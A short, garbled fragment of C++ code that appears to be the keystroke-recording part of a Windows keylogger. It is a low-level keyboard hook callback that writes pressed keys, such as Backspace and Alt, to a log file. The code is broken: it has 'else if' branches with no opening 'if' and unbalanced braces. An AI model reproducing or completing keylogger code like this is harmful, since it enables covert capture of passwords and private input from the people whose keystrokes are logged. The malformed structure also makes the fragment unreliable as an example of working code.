    if (nCode == HC_ACTION && wParam== WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kbd->vkCode;

        else if (vkCode == VK_BACK) logFile << "[BKSP]";

        else if (vkCode == VK_MENU) logFile << "[ALT]";

}
